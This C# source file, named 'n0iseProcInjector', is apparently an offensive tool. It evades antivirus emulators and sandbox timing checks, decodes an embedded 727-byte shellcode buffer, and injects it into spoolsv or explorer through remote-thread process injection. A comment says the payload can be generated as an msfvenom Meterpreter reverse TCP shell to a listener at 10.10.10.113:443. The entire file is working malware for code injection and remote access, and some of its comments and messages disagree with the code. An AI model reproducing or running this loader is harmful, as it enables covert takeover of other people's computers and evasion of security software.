using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace n0iseProcInjector
{

    internal class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF //PROCESS_ALL_ACCESS
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        static void Main(string[] args)
        {
            // detect AV emulator - optional
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            //timer - optional - lapse of 1.5 seconds t2 < 1.5
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            // payload sample, need to change and dont forget to change decoder!!! payload can be generated by msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.113 LPORT=443 EXITFUNC=thread -f csharp
            //byte[] buf = new byte[5] {0xa5, 0x48, 0xfa, 0xee, 0x45};

            byte[] buf = new byte[727] { 0x01, 0x4d, 0x88, 0xe9, 0xf5, 0xed, 0xd1, 0x05, 0x05, 0x05, 0x46, 0x56, 0x46, 0x55, 0x57, 0x4d, 0x36, 0xd7, 0x56, 0x5b, 0x6a, 0x4d, 0x90, 0x57, 0x65, 0x4d, 0x90, 0x57, 0x1d, 0x4d, 0x90, 0x57, 0x25, 0x4d, 0x90, 0x77, 0x55, 0x52, 0x36, 0xce, 0x4d, 0x14, 0xbc, 0x4f, 0x4f, 0x4d, 0x36, 0xc5, 0xb1, 0x41, 0x66, 0x81, 0x07, 0x31, 0x25, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0xe7, 0xf2, 0x57, 0x46, 0x56, 0x4d, 0x90, 0x57, 0x25, 0x90, 0x47, 0x41, 0x4d, 0x06, 0xd5, 0x6b, 0x86, 0x7d, 0x1d, 0x10, 0x07, 0x14, 0x8a, 0x77, 0x05, 0x05, 0x05, 0x90, 0x85, 0x8d, 0x05, 0x05, 0x05, 0x4d, 0x8a, 0xc5, 0x79, 0x6c, 0x4d, 0x06, 0xd5, 0x49, 0x90, 0x45, 0x25, 0x55, 0x4e, 0x06, 0xd5, 0x90, 0x4d, 0x1d, 0xe8, 0x5b, 0x4d, 0x04, 0xce, 0x46, 0x90, 0x39, 0x8d, 0x4d, 0x06, 0xdb, 0x52, 0x36, 0xce, 0x4d, 0x36, 0xc5, 0xb1, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0x3d, 0xe5, 0x7a, 0xf6, 0x51, 0x08, 0x51, 0x29, 0x0d, 0x4a, 0x3e, 0xd6, 0x7a, 0xdd, 0x5d, 0x49, 0x90, 0x45, 0x29, 0x4e, 0x06, 0xd5, 0x6b, 0x46, 0x90, 0x11, 0x4d, 0x49, 0x90, 0x45, 0x21, 0x4e, 0x06, 0xd5, 0x46, 0x90, 0x09, 0x8d, 0x46, 0x5d, 0x4d, 0x06, 0xd5, 0x46, 0x5d, 0x63, 0x5e, 0x5f, 0x46, 0x5d, 0x46, 0x5e, 0x46, 0x5f, 0x4d, 0x88, 0xf1, 0x25, 0x46, 0x57, 0x04, 0xe5, 0x5d, 0x46, 0x5e, 0x5f, 0x4d, 0x90, 0x17, 0xee, 0x50, 0x04, 0x04, 0x04, 0x62, 0x4d, 0x36, 0xe0, 0x58, 0x4e, 0xc3, 0x7c, 0x6e, 0x73, 0x6e, 0x73, 0x6a, 0x79, 0x05, 0x46, 0x5b, 0x4d, 0x8e, 0xe6, 0x4e, 0xcc, 0xc7, 0x51, 0x7c, 0x2b, 0x0c, 0x04, 0xda, 0x58, 0x58, 0x4d, 0x8e, 0xe6, 0x58, 0x5f, 0x52, 0x36, 0xc5, 0x52, 0x36, 0xce, 0x58, 0x58, 0x4e, 0xbf, 0x3f, 0x5b, 0x7e, 0xac, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0xed, 0x12, 0x05, 0x05, 0x05, 0x36, 0x35, 0x33, 0x36, 0x35, 0x33, 0x36, 0x35, 0x33, 0x36, 0x36, 0x38, 0x05, 0x5f, 0x4d, 0x8e, 0xc6, 0x4e, 0xcc, 0xc5, 0xc0, 0x06, 0x05, 0x05, 0x52, 0x36, 0xce, 0x58, 0x58, 0x6f, 0x08, 0x58, 0x4e, 0xbf, 0x5c, 0x8e, 0xa4, 0xcb, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0xed, 0xb4, 0x05, 0x05, 0x05, 0x34, 0x54, 0x37, 0x75, 0x5f, 0x4b, 0x73, 0x70, 0x73, 0x79, 0x7e, 0x7d, 0x6c, 0x32, 0x37, 0x4d, 0x3a, 0x46, 0x56, 0x72, 0x71, 0x3a, 0x7c, 0x79, 0x6f, 0x51, 0x5a, 0x7d, 0x5a, 0x77, 0x5a, 0x3e, 0x35, 0x7b, 0x39, 0x72, 0x7e, 0x3d, 0x4f, 0x4f, 0x32, 0x7b, 0x79, 0x6d, 0x58, 0x6c, 0x69, 0x54, 0x7e, 0x4b, 0x5f, 0x6d, 0x4c, 0x4d, 0x69, 0x5b, 0x52, 0x57, 0x64, 0x7d, 0x59, 0x7b, 0x56, 0x47, 0x35, 0x38, 0x5d, 0x71, 0x39, 0x3b, 0x7f, 0x51, 0x7a, 0x79, 0x72, 0x5f, 0x53, 0x3a, 0x64, 0x7f, 0x7b, 0x67, 0x7a, 0x48, 0x7e, 0x77, 0x6e, 0x5e, 0x70, 0x58, 0x48, 0x73, 0x3b, 0x73, 0x7d, 0x6a, 0x6f, 0x70, 0x5f, 0x48, 0x51, 0x6d, 0x6a, 0x53, 0x4f, 0x6f, 0x64, 0x5d, 0x6d, 0x5c, 0x36, 0x46, 0x56, 0x39, 0x52, 0x6a, 0x67, 0x4e, 0x6f, 0x69, 0x4d, 0x54, 0x64, 0x47, 0x78, 0x6a, 0x5d, 0x4e, 0x46, 0x4b, 0x4d, 0x3c, 0x5e, 0x7e, 0x74, 0x35, 0x3b, 0x75, 0x71, 0x76, 0x59, 0x7c, 0x64, 0x7b, 0x59, 0x66, 0x38, 0x4e, 0x5b, 0x7e, 0x71, 0x79, 0x3a, 0x6c, 0x32, 0x69, 0x71, 0x68, 0x7e, 0x5c, 0x47, 0x6e, 0x5b, 0x69, 0x5c, 0x4e, 0x5c, 0x69, 0x5b, 0x67, 0x3c, 0x72, 0x53, 0x53, 0x05, 0x4d, 0x8e, 0xc6, 0x58, 0x5f, 0x46, 0x5d, 0x52, 0x36, 0xce, 0x58, 0x4d, 0xbd, 0x05, 0x37, 0xad, 0x89, 0x05, 0x05, 0x05, 0x05, 0x55, 0x58, 0x58, 0x4e, 0xcc, 0xc7, 0xf0, 0x5a, 0x33, 0x40, 0x04, 0xda, 0x4d, 0x8e, 0xcb, 0x6f, 0x0f, 0x64, 0x4d, 0x8e, 0xf6, 0x6f, 0x24, 0x5f, 0x57, 0x6d, 0x85, 0x38, 0x05, 0x05, 0x4e, 0x8e, 0xe5, 0x6f, 0x09, 0x46, 0x5e, 0x4e, 0xbf, 0x7a, 0x4b, 0xa3, 0x8b, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x52, 0x36, 0xc5, 0x58, 0x5f, 0x4d, 0x8e, 0xf6, 0x52, 0x36, 0xce, 0x52, 0x36, 0xce, 0x58, 0x58, 0x4e, 0xcc, 0xc7, 0x32, 0x0b, 0x1d, 0x80, 0x04, 0xda, 0x8a, 0xc5, 0x7a, 0x24, 0x4d, 0xcc, 0xc6, 0x8d, 0x18, 0x05, 0x05, 0x4e, 0xbf, 0x49, 0xf5, 0x3a, 0xe5, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x4d, 0x04, 0xd4, 0x79, 0x07, 0xf0, 0xaf, 0xed, 0x5a, 0x05, 0x05, 0x05, 0x58, 0x5e, 0x6f, 0x45, 0x5f, 0x4e, 0x8e, 0xd6, 0xc6, 0xe7, 0x15, 0x4e, 0xcc, 0xc5, 0x05, 0x15, 0x05, 0x05, 0x4e, 0xbf, 0x5d, 0xa9, 0x58, 0xea, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x4d, 0x98, 0x58, 0x58, 0x4d, 0x8e, 0xec, 0x4d, 0x8e, 0xf6, 0x4d, 0x8e, 0xdf, 0x4e, 0xcc, 0xc5, 0x05, 0x25, 0x05, 0x05, 0x4e, 0x8e, 0xfe, 0x4e, 0xbf, 0x17, 0x9b, 0x8e, 0xe7, 0x05, 0x05, 0x05, 0x05, 0x04, 0xda, 0x4d, 0x88, 0xc9, 0x25, 0x8a, 0xc5, 0x79, 0xb7, 0x6b, 0x90, 0x0c, 0x4d, 0x06, 0xc8, 0x8a, 0xc5, 0x7a, 0xd7, 0x5d, 0xc8, 0x5d, 0x6f, 0x05, 0x5e, 0x4e, 0xcc, 0xc7, 0xf5, 0xba, 0xa7, 0x5b, 0x04, 0xda };

            int len = buf.Length;

            // parse arguments
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0)
            {
                // elevation default proc names
                if (IsElevated)
                {
                    procName = "spoolsv";
                    Console.WriteLine("Running not elevated. Injecting to {0}", procName);
                }
                else
                {
                    procName = "explorer";
                    Console.WriteLine("Running not elevated. Injecting to {0}", procName);
                }
            }
            else
            {
                Console.WriteLine("Help: either specify existing running process name to inject to by running \"n0iseProcInjector [runningProcessName]\" or just run the tool to automatically inject into suitable running process based on elevation.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // get proc ID
            Process[] expProc = Process.GetProcessesByName(procName);

            // if multiple match, inject into all
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // get process handle
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the XOR encoded (key 0xfe) payload if necessary
                /*
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfe);
                }
                */


                // Decode the caesar cipher encrypted (key 4) payload if necessary
                ///*
                for (int e = 0; e < buf.Length; e++)
                {
                    buf[e] = (byte)(((uint)buf[e] - 5) & 0xFF);
                }
                //*/

                // inject
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}
